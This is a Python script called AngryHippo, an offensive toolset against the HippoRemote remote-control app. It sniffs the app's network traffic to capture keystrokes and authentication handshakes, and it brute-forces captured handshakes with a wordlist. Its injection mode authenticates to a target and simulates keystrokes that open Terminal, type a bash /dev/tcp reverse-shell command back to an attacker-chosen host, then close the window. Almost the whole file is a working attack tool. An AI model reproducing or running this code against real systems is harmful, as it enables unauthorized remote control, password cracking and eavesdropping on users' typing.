#!/usr/bin/env python

import re
import time
import struct
import socket
import argparse
from scapy.all import *
from Crypto.Cipher import DES

def handshake(key,chall):

    #https://tools.ietf.org/html/rfc6143#section-7.2.2
    #http://www.vidarholen.net/contents/junk/vnc.html
    #Truncate to 8 chars
    key = key[:8]
    # Convert to binary
    binary = (' '.join(format(ord(x), 'b') for x in key))
    binaryList = binary.split()
    count=0
    #Add leading zeros
    for x in binaryList:
        binaryList[count] = ("0" * (8 - len(binaryList[count]))) + binaryList[count]
        count+=1
    # Function to mirror the byte
    def bitMirror(byte):
        return byte[::-1]
    flipkey=""
    # turn back into binary
    for x in binaryList:
        flipkey += struct.pack('B', int(bitMirror(x), 2))
    #Pad with NULL bytes
    flipkey += "\x00" * (8 - len(flipkey))
    #Encryptwith DES
    des = DES.new(flipkey, DES.MODE_ECB)
    #challenge from server
    challenge= chall.decode("hex")
    response = des.encrypt(challenge)
    return ''.join(x.encode('hex') for x in response)


def inject_keystrokes(address, port, password, listen_host, listen_port, speed):

    payload = "bash -i >& /dev/tcp/%s/%s 0>&1 & disown" % (listen_host, listen_port)
    BUFFER_SIZE = 1024
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    data = s.recv(BUFFER_SIZE)
    #strip out the challenge
    look_for = "authentication-challenge"
    splitter = data.split(look_for, 1)[1]
    stripped = re.sub(r'\W+', '', splitter)
    auth_response = str.upper(handshake(password, stripped))
    #return the response
    MESSAGE = '{"id":"handshake","authentication-response":"' + auth_response + '"}'
    s.send(MESSAGE)
    s.send("\x0d\x0a")
    time.sleep(1)

    open_terminal(s, speed)

    #Inject the payload
    i = 0
    while i < len(payload):
        s.send('{"id": "keyCharPress", "key": "' + payload[i] + '", "down": true}')
        s.send("\x0d\x0a")
        time.sleep(speed)
        s.send('{"id": "keyCharPress", "key": "' + payload[i] + '", "down": false}')
        s.send("\x0d\x0a")
        time.sleep(speed)
        i += 1
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")
    close_terminal(s, speed)

    s.close()

def print_banner():

    print '''                   /\____/\            _
                  /   ..   \          /_\  _ __   __ _ _ __ _   _
                 /  \    /  \        //_\\\\| '_ \ / _` | '__| | | |
                | 'X'    'X' |      /  _  \ | | | (_| | |  | |_| |
               / ____________ \     \_/ \_/_| |_|\__, |_|   \__, |
             , ,'    `--'    '. .              _  |___/      |___/
            _| |              | |_       /\  /(_)_ __  _ __   ___
          /  ' '              ' '  \    / /_/ / | '_ \| '_ \ / _ \\
         (    `,',__________.','    )  / __  /| | |_) | |_) | (_) |
          \_    ` .V______V, '    _/   \/ /_/ |_| .__/| .__/ \___/
             |                  |               |_|   |_|
             |    ,-.    ,-.    |
              \      ).,(      /       HippoRemote Hacking Toolset
                \___/    \___/                  ~n00py~
'''

def close_terminal(s, speed):

    s.send('{"id": "keyCodePress", "key": "CMD", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "Q", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "Q", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "CMD", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")


def open_terminal(s, speed):

    s.send('{"id": "keyCodePress", "key": "CMD", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": " ", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": " ", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "CMD", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "t", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "t", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "e", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "e", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "r", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "r", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "m", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "m", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "i", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "i", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "n", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "n", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "a", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "a", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "l", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCharPress", "key": "l", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(speed)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.10)


def sniffer(packet):
    if packet[TCP].payload:
        hippo_packet = str(packet[TCP].payload)
        if "keycharpress" in hippo_packet.lower() or "authentication-" in hippo_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


def brute_force(challenge,response, wordlist):

    start_time = time.time()
    f = open(wordlist, 'r')
    passlist = f.read().split('\n')
    for password in passlist:
        if len(password) <= 8:
            result = handshake(password, challenge)
            if str.upper(result) == response:
                print "Success! '" + password + "' is the correct password"
                sys.exit()
    print "time elapsed: {:.2f}s".format(time.time() - start_time)


def TrueXor(*args):
    #Makes sure only one option is selected
    return sum(args) == 1


def main():
    parser = argparse.ArgumentParser(description='AngryHippo is a multifaceted toolset to exploit HippoRemote')
    parser.add_argument('-sn','--sniff',help=' Use this option to sniff keystrokes and capture authentication handshakes', required=False, action='store_true')
    parser.add_argument('-in', '--inject', help=' Use this option to inject keystrokes to spawn a reverse shell', required=False, action='store_true')
    parser.add_argument('-cr', '--crack', help=' Use this option to crack a captured handshake', required=False, action='store_true')
    parser.add_argument('-w', '--wordlist', help='Wordlist file path for cracking handshakes', required=False)
    parser.add_argument('-ti','--timing',help=' Determines the speed of the keystroke injection. Default is .001(fast) ', type=float, default=.001, required=False)
    parser.add_argument('-p', '--port', help='Port number for listening server', required=False)
    parser.add_argument('-a', '--address', help='IP address of listening server', required=False)
    parser.add_argument('-k', '--key', help='This is the password to use for injecting keystrokes', required=False)
    parser.add_argument('-c', '--challenge', help='This is the value of the captured challenge', required=False)
    parser.add_argument('-r', '--response', help='This is the value of the captured response', required=False)
    parser.add_argument('-t', '--target', help='This is the IP address of the target', required=False)
    args = parser.parse_args()
    print_banner()

    if TrueXor(args.sniff, args.inject, args.crack) == False:
        print "Please select one option out of --sniff, --inject, or --crack"
        sys.exit()

    if args.sniff:
        print "Now sniffing for HippoRemote activity..."
        sniff(filter="tcp port 41660", prn=sniffer, store=0)

    if args.inject:
        if args.target is None:
            print "Please specify the address of the target system with --target"
            sys.exit()
        if args.port is None:
            print "Please specify the listening port of your server with --port"
            sys.exit()
        if args.key is None:
            print "Please specify the password --key"
            sys.exit()
        if args.address is None:
            print "Please specify the IP of your listening server with --address"
            sys.exit()
        print "Injecting keystrokes to spawn a reverse shell to " + args.address + " on port " + args.port + "..."
        inject_keystrokes(args.target, 41660, args.key, args.address, args.port, args.timing)

    if args.crack:
        if args.wordlist is None:
            print "Please specify the filepath to the wordlist with --wordlist"
            sys.exit()
        if args.challenge is None:
            print "Please specify the authentication-challenge with --challenge"
            sys.exit()
        if args.response is None:
            print "Please specify the authentication-response with --response"
            sys.exit()
        print "Cracking in progess..."
        brute_force(args.challenge, args.response, args.wordlist)


if __name__ == "__main__":

    main()

